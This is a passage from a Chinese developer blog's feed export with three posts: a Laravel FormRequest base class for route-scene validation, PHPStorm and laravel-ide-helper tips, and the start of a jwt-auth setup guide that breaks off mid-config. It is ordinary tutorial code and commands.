*/</span></span><br><span class="line">    <span class="keyword">protected</span> $scene = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 是否自动验证</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $autoValidate = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $onlyRule=[];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Determine if the user is authorized to make this request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authorize</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> \Illuminate\Auth\Access\AuthorizationException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validateResolved</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="string">'autoValidate'</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;autoValidate = <span class="keyword">$this</span>-&gt;container-&gt;call([<span class="keyword">$this</span>, <span class="string">'autoValidate'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;autoValidate) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handleValidate();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> \Illuminate\Auth\Access\AuthorizationException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">handleValidate</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;prepareForValidation();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;passesAuthorization()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;failedAuthorization();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;getValidatorInstance();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($instance-&gt;fails()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;failedValidation($instance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义 getValidatorInstance 下 validator 验证器</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $factory</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validator</span><span class="params">($factory)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $factory-&gt;make(<span class="keyword">$this</span>-&gt;validationData(), <span class="keyword">$this</span>-&gt;getRules(), <span class="keyword">$this</span>-&gt;messages(), <span class="keyword">$this</span>-&gt;attributes());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 验证方法（关闭自动验证时控制器调用）</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $scene  场景名称 或 验证规则</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">validate</span><span class="params">($scene = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autoValidate) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($scene)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;onlyRule = $scene;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;scene = $scene;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;handleValidate();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取 rules</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRules</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handleScene(<span class="keyword">$this</span>-&gt;container-&gt;call([<span class="keyword">$this</span>, <span class="string">'rules'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 场景验证</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $rule</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">handleScene</span><span class="params">(array $rule)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;onlyRule) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handleRule(<span class="keyword">$this</span>-&gt;onlyRule, $rule);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $sceneName = <span class="keyword">$this</span>-&gt;getSceneName();</span><br><span class="line">        <span class="keyword">if</span> ($sceneName &amp;&amp; method_exists(<span class="keyword">$this</span>, <span class="string">'scene'</span>)) &#123;</span><br><span class="line">            $scene = <span class="keyword">$this</span>-&gt;container-&gt;call([<span class="keyword">$this</span>, <span class="string">'scene'</span>]);</span><br><span class="line">            <span class="keyword">if</span> (array_key_exists($sceneName, $scene)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handleRule($scene[$sceneName], $rule);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  $rule;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理Rule</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $sceneRule</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $rule</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">handleRule</span><span class="params">(array $sceneRule, array $rule)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $rules = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($sceneRule <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_numeric($key) &amp;&amp; array_key_exists($value, $rule)) &#123;</span><br><span class="line">                $rules[$value] = $rule[$value];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $rules[$key] = $value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $rules;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取场景名称</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getSceneName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> is_null(<span class="keyword">$this</span>-&gt;scene) ? <span class="keyword">$this</span>-&gt;route()-&gt;getAction(<span class="string">'_scene'</span>) : <span class="keyword">$this</span>-&gt;scene;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过重写 failedValidation，方便Request 类抛出异常</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Validator $validator</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">failedValidation</span><span class="params">(Validator $validator)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpResponseException(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;failed($validator-&gt;errors()-&gt;first())</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>ApiResponse</code> 是一个封装了返回客户端内容的 Trait。</p><h2 id="添加路由场景方法"><a href="#添加路由场景方法" class="headerlink" title="添加路由场景方法"></a>添加路由场景方法</h2><p>然后在 <code>app\Providers\AppServiceProvider.php</code> 类中的 <code>boot()</code> 方法中添加场景方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Providers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Routing</span>\<span class="title">Route</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">ServiceProvider</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppServiceProvider</span> <span class="keyword">extends</span> <span class="title">ServiceProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Bootstrap any application services.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boot</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 添加场景验证 scene 方法</span></span><br><span class="line">        Route::macro(<span class="string">'scene'</span>, <span class="function"><span class="keyword">function</span> <span class="params">($scene = null)</span> </span>&#123;</span><br><span class="line">            $action = Route::getAction();</span><br><span class="line">            $action[<span class="string">'_scene'</span>] = $scene;</span><br><span class="line">            Route::setAction($action);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用路由场景方法"><a href="#使用路由场景方法" class="headerlink" title="使用路由场景方法"></a>使用路由场景方法</h2><p>该自定义方法用于路由场景验证，在 <code>Route-&gt;action</code> 增加一个 <code>_scene</code> 属性。其实用法和路由别名函数是一样的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::post(<span class="string">'add'</span>,<span class="string">'UserController@add'</span>)-&gt;scene(<span class="string">'add'</span>);</span><br></pre></td></tr></table></figure><h2 id="路由场景验证"><a href="#路由场景验证" class="headerlink" title="路由场景验证"></a>路由场景验证</h2><p><code>UserRequest</code> 使用示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Requests</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Http</span>\<span class="title">BaseRequest</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserRequest</span> <span class="keyword">extends</span> <span class="title">BaseRequest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Determine if the user is authorized to make this request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">authorize</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the validation rules that apply to the request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rules</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 定义验证规则</span></span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'required|string|unique:users'</span>,</span><br><span class="line">            <span class="string">'email'</span> =&gt; <span class="string">'required|email|unique:users'</span>,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 场景规则</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">scene</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 格式  ['场景名' =&gt; [规则]]</span></span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">             <span class="comment">// add 场景</span></span><br><span class="line">            <span class="string">'add'</span> =&gt; [</span><br><span class="line">                <span class="string">'name'</span>,                          <span class="comment">// 复用 rules() 下 name 规则</span></span><br><span class="line">                <span class="string">'email'</span> =&gt; <span class="string">'email|unique:users'</span>  <span class="comment">// 重置规则</span></span><br><span class="line">            ],</span><br><span class="line">             <span class="comment">// edit场景</span></span><br><span class="line">            <span class="string">'edit'</span> =&gt; [<span class="string">'name'</span>],</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>scene()</code> 方法中的场景，不是控制器的方法名称，而是需要通过路由去自定义，可以使任意合法的名称，不一定要与控制器方法名保持一致。</p><p>至此就完成了上面提到的三个需求，使用起来也比较简单，没有破坏框架原本用法。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/articles/38825#863a85" target="_blank" rel="noopener">Laravel 验证类 实现 路由场景验证 和 控制器场景验证</a></li><li><a href="https://learnku.com/laravel/t/31215" target="_blank" rel="noopener">修改 Laravel FormRequest 验证，实现场景验证</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPStorm 使用技巧整理</title>
      <link href="/phpstorm-use-skills-finishing/"/>
      <url>/phpstorm-use-skills-finishing/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记用来整理 PHPStorm 的一些使用技巧。</p><a id="more"></a><h2 id="类型提示"><a href="#类型提示" class="headerlink" title="类型提示"></a>类型提示</h2><p>在使用IDE 开发的过程中，不知你是否有注意到这样一个问题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">article</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hasMany(User::class)-&gt;where(<span class="function"><span class="keyword">function</span><span class="params">($query)</span></span>&#123;</span><br><span class="line">        $query-&gt;where(<span class="string">'open'</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在使用<code>$query</code> 调用 <code>where</code> 方法时，默认是没有提示的，这是为什么呢？</p><p>这是因为PHP 语言特性的原因，一个数组可以存放各种类型的值，无法从外部知道里面的值具体是什么类型，这就导致IDE 无法给出有效的提示了。</p><p>其实这时我们只需要显示的告诉IDE，这个变量具体是什么类型的，编译器就能正常提示了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210605113822.png" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** <span class="doctag">@var</span> Collection $collection */</span></span><br></pre></td></tr></table></figure><h2 id="IDE-Helper"><a href="#IDE-Helper" class="headerlink" title="IDE Helper"></a>IDE Helper</h2><p><a href="https://github.com/barryvdh/laravel-ide-helper#laravel-ide-helper-generator" target="_blank" rel="noopener">Laravel IDE Helper</a> 是一个代码提示及补全工具。</p><p>只在开发环境中安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require --dev barryvdh/laravel-ide-helper</span><br></pre></td></tr></table></figure><p>对于只在开发环境中需要安装的扩展包，在 app/Providers/AppServiceProvider.php 文件中以如下方式进行注册：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;app-&gt;environment() !== <span class="string">'production'</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;app-&gt;register(\Barryvdh\LaravelIdeHelper\IdeHelperServiceProvider::class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="为-Facades-生成注释"><a href="#为-Facades-生成注释" class="headerlink" title="为 Facades 生成注释"></a>为 Facades 生成注释</h3><p>运行一下命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan ide-helper:generate</span><br></pre></td></tr></table></figure><p>执行完成之后会在项目根目录下生成一个 <code>_ide_helper.php</code> 文件。</p><h3 id="为模型生成注解"><a href="#为模型生成注解" class="headerlink" title="为模型生成注解"></a>为模型生成注解</h3><p>使用Laravel 为我们提供的 <code>make:model</code> 默认不会为在模型文件中，生成相应的注解。</p><p>当我们需要通过对象获取模型的某个属性时，IDE 这时会提示未定义的属性，虽然不会影响功能的使用，但是对于开发人员来说并不友好。</p><p>看起来就像这样：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210605110602.png" alt=""></p><p>使用<code>IDE Helper</code> 来生成模型注解：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php artisan ide-helper:models "App\Models\UserModel"</span><br><span class="line"></span><br><span class="line">Do you want to overwrite the existing model files? Choose no to write to _ide_helper_models.php instead? (Yes/No):  (yes/no) [no]:</span><br></pre></td></tr></table></figure><p>建议选择『yes』，否则会生成「_ide_helper_models.php」文件，这样在跟踪文件的时候不会跳转到「_ide_helper_models.php」文件。</p><p>如果希望为所有模型都加上注解，则省略后面的参数。</p><p>看起来好多了：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210605111205.png" alt=""></p><blockquote><p>注意： 为模型生成字段信息必须在数据库中存在相应的数据表。</p></blockquote><h3 id="自动为链式操作注释"><a href="#自动为链式操作注释" class="headerlink" title="自动为链式操作注释"></a>自动为链式操作注释</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan ide-helper:meta</span><br></pre></td></tr></table></figure><p>执行完成之后会在项目根目录下生成一个 <code>.phpStorm.meta.php</code> 文件。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> PHPStorm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> PHPStorm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravel jwt-auth 使用详解</title>
      <link href="/laravel-jwt-auth-use-detailed-explanation/"/>
      <url>/laravel-jwt-auth-use-detailed-explanation/</url>
      
        <content type="html"><![CDATA[<p>通常后端在开发Api 应用时，会给客户端一个唯一Token 进行标示，获取Token 的方式有很多，这里以 JWT 为例，介绍其概念及使用方法。</p><a id="more"></a><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p><a href="https://jwt.io/" target="_blank" rel="noopener">JWT</a> 是 <code>JSON Web Token</code> 的缩写，是一个非常轻巧的规范，这个规范允许我们使用 JWT 在用户和服务器之间传递安全可靠的信息。</p><p>JWT 由头部（header）、载荷（payload）与签名（signature）组成，一个 JWT 类似下面这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;typ&quot;:&quot;JWT&quot;,</span><br><span class="line">    &quot;alg&quot;:&quot;HS256&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;iss&quot;:&quot;http:&#x2F;&#x2F;larabbs.test&quot;,</span><br><span class="line">    &quot;iat&quot;:1515733500,</span><br><span class="line">    &quot;exp&quot;:1515737100,</span><br><span class="line">    &quot;nbf&quot;:1515733500,</span><br><span class="line">    &quot;jti&quot;:&quot;c3U4VevxG2ZA1qhT&quot;,</span><br><span class="line">    &quot;sub&quot;:1,</span><br><span class="line">    &quot;prv&quot;:&quot;23bd5c8949f600adb39e701c400872db7a5976f7&quot;</span><br><span class="line">&#125;</span><br><span class="line">signature</span><br></pre></td></tr></table></figure><ul><li>头部声明了加密算法；</li><li>载荷中有两个比较重要的数据，exp 是过期时间，sub 是 JWT 的主体，这里就是用户的 id；</li><li>最后的 signature 是由服务器生成的签名，保证了 token 不被篡改。</li></ul><p>这三部分是分别用 <code>base64url</code> 进行编码，然后通过<code>.</code> 符号组合在一起，最后得到的token 大概是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxxx.yyyyyy.zzzzzz</span><br></pre></td></tr></table></figure><p>x、y、z 部分分别代表了各自部位对应的信息。</p><blockquote><p>注意⚠️：JWT 最后是通过 Base64 编码的，也就是说，它可以被翻译回原来的样子来的。所以不要在 JWT 中存放一些敏感信息。</p></blockquote><h3 id="思考题："><a href="#思考题：" class="headerlink" title="思考题："></a>思考题：</h3><p>Token 既然会下发给客户端，那为什么不用保存一份在服务端？</p><p>这是因为，唯一的签名保存在服务端，所以无需担心Token 中的信息可能被篡改，清楚这一点之后，只需要验证Token 的合法性。</p><h3 id="Token-验证"><a href="#Token-验证" class="headerlink" title="Token 验证"></a>Token 验证</h3><p>有了 token 之后该如何验证 token 的有效性，并得到 token 对应的用户呢？</p><p>Laravel 为我们准备好了 <code>auth</code> 这个中间件：</p><ul><li>获取客户端提交的 token</li><li>检测 token 中的签名 signature 是否正确</li><li>判断 payload 数据中的 exp，是否已经过期</li><li>根据 payload 数据中的 sub（用户 ID），取数据库中验证用户是否存在</li><li>上述检测不正确，则抛出相应异常</li></ul><p>并且幸运的是，一些勤劳的人，已经帮我们完成了这部分工作。</p><h2 id="jwt-auth"><a href="#jwt-auth" class="headerlink" title="jwt-auth"></a>jwt-auth</h2><p><a href="https://github.com/tymondesigns/jwt-auth" target="_blank" rel="noopener">jwt-auth</a> 是 Laravel 和 lumen 下一个优秀 JWT 组件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require tymon/jwt-auth</span><br></pre></td></tr></table></figure><p>安装完成后，需要生成一个 JWT 的 secret，这个 secret 很重要，用于最后的签名，更换这个 secret 会导致之前生成的所有 token 无效。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan jwt:secret</span><br></pre></td></tr></table></figure><p>可以看到在 <code>.env</code> 文件中，增加了一行 <code>JWT_SECRET</code>。</p><p>发布配置文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php artisan vendor:publish --provider="Tymon\JWTAuth\Providers\LaravelServiceProvider"</span><br></pre></td></tr></table></figure><p>会在<code>config</code> 目录下生成一个<code>jwt.php</code> 的配置文件。</p><p>修改 <code>config/auth.php</code>，将 <code>api guard</code> 的 <code>driver</code> 改为 <code>jwt</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 默认的 guard</span></span><br><span class="line"><span class="string">'defaults'</span> =&gt; [</span><br><span class="line">    <span class="string">'guard'</span> 